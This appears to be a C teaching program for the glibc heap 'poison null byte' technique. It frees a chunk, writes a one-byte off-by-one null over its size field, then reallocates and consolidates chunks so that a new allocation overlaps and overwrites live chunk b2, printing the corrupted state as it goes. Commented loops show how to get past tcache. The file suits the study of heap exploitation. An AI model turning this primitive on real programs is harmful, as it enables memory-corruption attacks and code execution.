#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main() {
	uint8_t *a, *b, *c, *b1, *b2, *d;

	a = (uint8_t *) malloc(0x10);
	int real_a_size = malloc_usable_size(a);
	fprintf(stderr, "malloc(0x10) for chunk a: %p, real_size: %#x\n", a, real_a_size);

	b = (uint8_t *) malloc(0x100);
	uint64_t *b_size_ptr = (uint64_t *) (b - 8);
	fprintf(stderr, "malloc(0x100) for chunk b: %p, size: %#lx\n", b, *b_size_ptr);

	c = (uint8_t *) malloc(0x80);
	uint64_t *c_prev_size_ptr = (uint64_t *) (c - 0x10);
	fprintf(stderr, "malloc(0x80) for chunk c: %p, prev_size: %#lx\n", c, *c_prev_size_ptr);

	/*
	int *t[10], i;						// tcache
	for (i = 0; i < 7; i++) {
		t[i] = malloc(0x100);
	}
	for (i = 0; i < 7; i++) {
		free(t[i]);
	} */

	// *(size_t *) (b + 0xf0) = 0x100;	// pass the check: chunksize(P) == prev_size (next_chunk(P))

	free(b);
	a[real_a_size] = 0;
	fprintf(stderr, "\nfree(b) and null byte off-by-one!\nnew b.size: %#lx\n", *b_size_ptr);

	b1 = malloc(0x80);
	b2 = malloc(0x40);
	fprintf(stderr, "malloc(0x80) for chunk b1: %p\n",b1);
	fprintf(stderr, "malloc(0x40) for chunk b2: %p\n",b2);
	fprintf(stderr, "now c.prev_size: %#lx\n",*c_prev_size_ptr);
	fprintf(stderr, "fake c.prev_size: %#lx\n\n", *((uint64_t *) (c - 0x20)));

	memset(b2, 'B', 0x40);
	fprintf(stderr, "current b2 content:\n%s\n",b2);

	/*
	for (i = 0; i < 7; i++) {
		t[i] = malloc(0x80);
	}
	for (i = 0; i < 7; i++) {
		free(t[i]);
	} */

	free(b1);
	free(c);
	fprintf(stderr, "free b1 and c, make them consolidated\n");

	d = malloc(0x110);
	fprintf(stderr, "malloc(0x110) for chunk d: %p\n",d);

	memset(d, 'D', 0xb0);
	fprintf(stderr, "new b2 content:\n%s\n",b2);
}
